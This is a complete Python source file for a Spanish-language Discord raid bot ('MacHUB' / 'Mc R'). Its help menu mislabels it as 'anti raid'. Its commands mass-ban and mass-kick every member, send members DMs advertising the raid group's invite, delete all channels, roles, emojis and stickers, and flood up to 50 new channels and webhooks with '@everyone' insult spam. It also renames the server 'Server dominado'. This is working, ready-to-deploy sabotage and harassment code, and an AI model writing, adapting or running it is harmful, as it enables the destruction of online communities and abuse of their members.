import discord
from discord.ext import commands
import asyncio
import logging
import os
import random
from datetime import datetime
import aiohttp
import io

# Configuración de logging optimizada para monitoreo
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

PREFIX = "!"
TOKEN = os.getenv("DISCORD_TOKEN") or "TU_TOKEN_AQUI"

# El banner animado de Discord configurado de forma global
GIF_URL = "https://cdn.discordapp.com/banners/1334323253992361986/a_1da916f82737a9ca0084c939821aaba7.webp?size=2048&animated=true"

# ================= VARIABLES GLOBALES INDEPENDIENTES =================
ejecuciones_por_servidor = {}  
MAX_EJECUCIONES = 99999
tiempo_inicio = datetime.now()

# Configuración explícita de los Intents necesarios
intents = discord.Intents.default()
intents.members = True  
intents.messages = True  
intents.message_content = True  

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    global tiempo_inicio
    tiempo_inicio = datetime.now()
    logging.info(f"⚡ MacHUB Engine Conectado: {bot.user.name} (ID: {bot.user.id})")


# === FUNCIÓN AUXILIAR PARA ENVIAR EL GIF COMO ARCHIVO REAL (SIN ENLACES DE TEXTO) ===
async def obtener_gif_file():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(GIF_URL) as resp:
                if resp.status == 200:
                    data = io.BytesIO(await resp.read())
                    return discord.File(data, filename="machub_banner.webp")
    except Exception as e:
        logging.error(f"Error al descargar el GIF global: {e}")
    return None


# ================= FUNCIÓN AUXILIAR PARA EL EMBED DE !eje =================
def generar_embed_eje(guild_id):
    global ejecuciones_por_servidor, MAX_EJECUCIONES
    
    # Obtiene las ejecuciones actuales de este servidor
    actuales = ejecuciones_por_servidor.get(guild_id, 0)
    
    # Color dinámico por estado: Verde (0), Amarillo (1), Rojo (2 o más)
    if actuales == 0:
        color = discord.Color.green()
    elif actuales == 1:
        color = discord.Color.orange()
    else:
        color = discord.Color.red()
    
    embed = discord.Embed(
        title="📊 CONTROL DE EJECUCIONES",
        description=f"Ejecuciones del bot en este servidor: `{actuales}/{MAX_EJECUCIONES}`",
        color=color
    )
    embed.set_footer(text="MacHUB Engine • Monitoreo en vivo")
    embed.timestamp = datetime.now()
    return embed


# ================= COMANDO !eje =================
@bot.command()
async def eje(ctx):
    if not ctx.guild: return  
    
    embed = generar_embed_eje(ctx.guild.id)
    try:
        await ctx.send(embed=embed)
    except:
        pass


# ================= 1. COMANDO BANPRO =================
@bot.command()
async def banpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.ban_members: return
    if not ctx.guild.me.guild_permissions.ban_members: return
    
    mensaje_dm = "Mi bot te baneo de tu servidor 😂 quieres hacerlo? Unete aqui https://discord.gg/aACMXB4HSp"
    gif_file = await obtener_gif_file()
    
    targets = [
        member for member in ctx.guild.members 
        if not member.bot and member.id != ctx.author.id and member.top_role < ctx.guild.me.top_role
    ]
    
    if len(targets) == 0: return

    chunk_size = 15
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        
        async def process_member(member):
            try: 
                # Se envía el mensaje y el archivo GIF adjunto limpio por DM
                if gif_file:
                    # Copiamos los bytes para reutilizar el archivo en bucles masivos
                    gif_file.fp.seek(0)
                    await member.send(content=mensaje_dm, file=gif_file)
                else:
                    await member.send(content=mensaje_dm)
            except: 
                pass
            try: await member.ban(reason="Baneo masivo By Mac.")
            except: pass

        tasks = [process_member(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.8)


# ================= 2. COMANDO RAIDEAR Y SPAM (rD) ACTUALIZADO =================
@bot.command()
async def rD(ctx):
    global ejecuciones_por_servidor
    if not ctx.guild or not ctx.author.guild_permissions.manage_channels: return

    actuales = ejecuciones_por_servidor.get(ctx.guild.id, 0)
    if actuales >= MAX_EJECUCIONES: return

    ejecuciones_por_servidor[ctx.guild.id] = actuales + 1
    
    # 1. Borrar canales previos
    for channel in list(ctx.guild.channels):
        try: await channel.delete()
        except: pass

    # 2. Crear canal especial (Sin spam)
    try:
        ch_esp = await ctx.guild.create_text_channel(name="Unete-a-Mc-r")
        await ch_esp.send("https://discord.gg/pRnwdc3gQj")
    except: pass

    # 3. Función auxiliar de spam para cada canal
    async def spam_en_canal(channel):
        for _ in range(400): # Total 20,000 mensajes (50 * 400)
            try:
                await channel.send("@everyone server raideado putos respeten a sus mayores https://discord.gg/pRnwdc3gQj")
                await asyncio.sleep(1.2) # Pausa para Railway
            except:
                break

    # 4. Crear 50 canales de spam y lanzar tareas
    for i in range(50):
        try:
            ch = await ctx.guild.create_text_channel(name=f"Raid-by-Mc-R{i}")
            await asyncio.sleep(0.5) 
            asyncio.create_task(spam_en_canal(ch))
        except: 
            pass

    ejecuciones_por_servidor[ctx.guild.id] = max(0, ejecuciones_por_servidor.get(ctx.guild.id, 1) - 1)


# ================= 3. EXPULSIÓN MASIVA =================
@bot.command()
async def kickpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.kick_members: return
    if not ctx.guild.me.guild_permissions.kick_members: return

    try: 
        gif_file = await obtener_gif_file()
        if gif_file: await ctx.send(file=gif_file)
    except: pass

    targets = [
        member for member in ctx.guild.members 
        if not member.bot and member.id != ctx.author.id and member.top_role < ctx.guild.me.top_role
    ]

    if len(targets) == 0: return

    chunk_size = 15
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        
        async def process_kick(member):
            try: await member.kick(reason="Limpieza Masiva By Mac.")
            except: pass

        tasks = [process_kick(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.8)


# ================= 4. CAMBIAR IDENTIDAD DEL SERVIDOR =================
@bot.command()
async def rnServers(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_guild: return
    if not ctx.guild.me.guild_permissions.manage_guild: return

    try:
        await ctx.guild.edit(name="Mc R", description="Server dominado.")
        gif_file = await obtener_gif_file()
        if gif_file: await ctx.send(file=gif_file)
    except:
        pass


# ================= 5. BORRAR TODOS LOS ROLES =================
@bot.command()
async def rolesD(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_roles: return
    if not ctx.guild.me.guild_permissions.manage_roles: return

    try: 
        gif_file = await obtener_gif_file()
        if gif_file: await ctx.send(file=gif_file)
    except: pass

    roles_to_delete = [
        role for role in ctx.guild.roles 
        if role.name != "@everyone" and role < ctx.guild.me.top_role and not role.is_bot_managed()
    ]

    for role in roles_to_delete:
        try: await role.delete(reason="Remoción de roles.")
        except: pass
        await asyncio.sleep(0.2)


# ================= 6. CREACIÓN MASIVA DE ROLES =================
@bot.command()
async def rolesC(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_roles: return
    if not ctx.guild.me.guild_permissions.manage_roles: return

    try: 
        gif_file = await obtener_gif_file()
        if gif_file: await ctx.send(file=gif_file)
    except: pass

    async def create_role_task():
        try:
            color_aleatorio = discord.Color(random.randint(0, 0xFFFFFF))
            await ctx.guild.create_role(name="Mc R", color=color_aleatorio)
        except:
            pass

    for i in range(0, 50, 10):
        tasks = [create_role_task() for _ in range(10)]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.5)


# ================= 7. SATURACIÓN DE CATEGORÍAS =================
@bot.command()
async def ccpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_channels: return
    if not ctx.guild.me.guild_permissions.manage_channels: return

    for channel in list(ctx.guild.channels):
        try: await channel.delete()
        except: pass

    async def create_category_task():
        try: await ctx.guild.create_category(name="Mc R")
        except: pass

    for i in range(0, 50, 10):
        tasks = [create_category_task() for _ in range(10)]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.4)


# ================= 8. CAMBIAR APODOS GLOBALMENTE =================
@bot.command()
async def nickpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_nicknames: return
    if not ctx.guild.me.guild_permissions.manage_nicknames: return

    try: 
        gif_file = await obtener_gif_file()
        if gif_file: await ctx.send(file=gif_file)
    except: pass

    targets = [
        m for m in ctx.guild.members 
        if m.id != ctx.guild.owner_id and m.top_role < ctx.guild.me.top_role
    ]

    chunk_size = 20
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        
        async def set_nick(member):
            try: await member.edit(nick="Mc R")
            except: pass

        tasks = [set_nick(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.5)


# ================= 9. BORRAR EMOJIS Y STICKERS =================
@bot.command()
async def emojisD(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_expressions: return
    if not ctx.guild.me.guild_permissions.manage_expressions: return

    try: 
        gif_file = await obtener_gif_file()
        if gif_file: await ctx.send(file=gif_file)
    except: pass

    for emoji in list(ctx.guild.emojis):
        try: await emoji.delete()
        except: pass
    
    for sticker in list(ctx.guild.stickers):
        try: await sticker.delete()
        except: pass


# ================= 10. MULTI-WEBHOOK ATTACK =================
@bot.command()
async def hookpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_webhooks: return
    if not ctx.guild.me.guild_permissions.manage_webhooks: return

    channels = ctx.guild.text_channels
    if not channels: return

    mensaje_webhook = "@everyone server raideado putoooos https://discord.gg/aACMXB4HSp"
    gif_file = await obtener_gif_file()

    async def launch_webhook(channel):
        try:
            webhook = await channel.create_webhook(name="Mc R Engine")
            for _ in range(25):
                if gif_file:
                    gif_file.fp.seek(0)
                    await webhook.send(content=mensaje_webhook, file=gif_file, username="Mc R")
                else:
                    await webhook.send(content=mensaje_webhook, username="Mc R")
                await asyncio.sleep(0.2)
        except:
            pass

    tasks = [launch_webhook(ch) for ch in channels[:15]]
    await asyncio.gather(*tasks)


# ================= 11. COMANDO UPTIME =================
@bot.command()
async def uptime(ctx):
    try:
        delta_tiempo = datetime.now() - tiempo_inicio
        dias = delta_tiempo.days
        horas, rem = divmod(delta_tiempo.seconds, 3600)
        minutos, segundos = divmod(rem, 60)
        
        ping_ms = round(bot.latency * 1000)
        
        await ctx.send(
            f"📊 **Estado del Bot:**\n"
            f"⏱️ **Tiempo activo:** `{dias}d {horas}h {minutos}m {segundos}s`\n"
            f"⚡ **Latencia (Ping):** `{ping_ms}ms`"
        )
    except:
        pass


# ================= 12. MENÚ DE AYUDA COMPLETO =================
@bot.command()
async def ayuda(ctx):
    menu = (
        "```\n"
        "=== Mc R Anti raid - cmds ===\n"
        "!uptime       -> Muestra el tiempo activo del bot y la latencia.\n"
        "!eje          -> Muestra el estado de ejecuciones del bot en vivo.\n"
        "!banpro       -> DM Masivo + Ban global a todos los miembros.\n"
        "!kickpro      -> Expulsa de inmediato a todos los miembros.\n"
        "!rD           -> elimina todo, crear 51 canales e inundar con 20k mensajes.\n"
        "!ccpro        -> elimina canales y crea 50 categorías para colapsar UI.\n"
        "!hookpro      -> Genera webhooks de spam ultra veloz por canal.\n"
        "!nickpro      -> Modifica el apodo de todos los usuarios a 'Mc R'.\n"
        "!rnServers    -> Cambia el nombre del servidor a 'Mc R'.\n"
        "!rolesD       -> Destruye todos los roles existentes del servidor.\n"
        "!rolesC       -> Genera 50 roles con colores arcoíris aleatorios.\n"
        "!emojisD      -> elimina los emojis y stickers personalizados.\n"
        "```"
    )
    try: 
        await ctx.send(menu)
    except: 
        pass


# ================= MANEJO DE ERRORES =================
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound): 
        return
    
    logging.error(f"Error: {error}")

bot.run(TOKEN)
        
